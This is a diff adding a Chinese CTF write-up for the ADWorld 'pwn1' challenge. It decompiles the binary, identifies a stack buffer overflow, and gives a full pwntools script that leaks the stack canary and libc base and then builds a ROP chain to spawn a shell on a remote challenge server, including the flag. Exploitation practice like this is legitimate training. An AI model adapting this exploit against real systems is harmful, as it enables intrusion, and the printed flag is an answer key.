@@ -1223,6 +1223,128 @@ io.interactive()
 
 ------
 
+### [pwn1](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=4598)
+
+先`file ./pwn1`查看文件类型再`checksec --file=./pwn1`检查一下文件保护情况。
+
+![](https://paper.tanyaodan.com/ADWorld/pwn/4598/1.png)
+
+用`IDA Pro 64bit`打开附件`pwn1`，按`F5`反汇编查看主函数源码：
+
+```c
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  int v3; // eax
+  char s[136]; // [rsp+10h] [rbp-90h] BYREF
+  unsigned __int64 v6; // [rsp+98h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stderr, 0LL, 2, 0LL);
+  memset(s, 0, 0x80uLL);
+  while ( 1 )
+  {
+    sub_4008B9();
+    v3 = sub_400841();
+    switch ( v3 )
+    {
+      case 2:
+        puts(s);
+        break;
+      case 3:
+        return 0LL;
+      case 1:
+        read(0, s, 0x100uLL);   //这里就是栈溢出漏洞点
+        break;
+      default:
+        sub_400826("invalid choice");
+        break;
+    }
+    sub_400826(&unk_400AE7);
+  }
+}
+```
+
+双击`sub_4008B9()`函数查看详情，可以看到有三个可选项：
+
+```c
+__int64 sub_4008B9()
+{
+  sub_400826("--------");
+  sub_400826("1.store");
+  sub_400826("2.print");
+  sub_400826("3.quit");
+  sub_400826("--------");
+  return sub_4007F7(">> ");
+}
+```
+
+由于文件开启了`canary`保护，所以我们需要先泄露`canary`。而栈溢出漏洞点就在选择`1`后的`read(0, s, 0x100uLL);`，读取的字符长度超出了`char`型数组的定义长度。此外，我们还需要用`ROPgadget`找到`pop_rdi_ret`的地址：
+
+```bash
+ROPgadget --binary ./babystack --only "pop|ret"
+```
+
+接着就可以绕开`canary`保护，利用`puts()`函数的`got`表和`plt`表来泄露`puts()`函数在内存中的地址，从而得到`libc`的版本信息和`libc`的基址地址，最后构造`ROP`链来获取`shell`。编写`Python`代码即可得到`cyberpeace{987dd90c37712192c8f03a9f47c6e879}`。
+
+```python
+from pwn import *
+from LibcSearcher import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('111.200.241.244', 56617)
+e = ELF('./babystack')
+ 
+def get_info():
+	info = io.recvline()
+	return info
+ 
+def store_info(payload):
+	io.sendlineafter(b'>> ', b'1')
+	io.sendline(payload)
+	return get_info()
+ 
+ 
+def print_info():
+	io.sendlineafter(b'>> ', b'2')
+	return get_info()
+ 
+#leak canary
+payload = b'a'*0x88
+store_info(payload)
+print_info()
+canary = u64(io.recv(7).rjust(8, b'\x00'))
+log.success("canary => %#x", canary)
+
+# leak libcbase_address 
+pop_rdi = 0x400a93
+puts_got = e.got['puts']
+puts_plt = e.plt['puts']
+main_address = 0x400908
+payload = b'a'*0x88 + p64(canary) + b't0ur1st!'
+payload += flat(pop_rdi, puts_got, puts_plt, main_address)
+store_info(payload)
+io.sendlineafter(b'>> ', b'3')
+puts_address = u64(io.recv(6).ljust(8, b'\x00'))
+log.info("puts_address => %#x", puts_address)
+libc = LibcSearcher('puts', puts_address)  # libc6_2.23-0ubuntu10_amd64
+libcbase = puts_address - libc.dump('puts')
+
+# get shell
+system_address = libcbase + libc.dump('system')
+log.success("system_address => %#x", system_address)
+bin_sh_address = libcbase + libc.dump('str_bin_sh')
+log.success("binsh_address => %#x", bin_sh_address)
+payload = b'a'*0x88 + p64(canary) + b't0ur1st!'
+payload += flat(pop_rdi, bin_sh_address, system_address, main_address)
+store_info(payload)
+io.sendlineafter(b'>> ', b'3')
+io.interactive()
+```
+
+------
+
 ## CTFShow
 
 ### pwn02
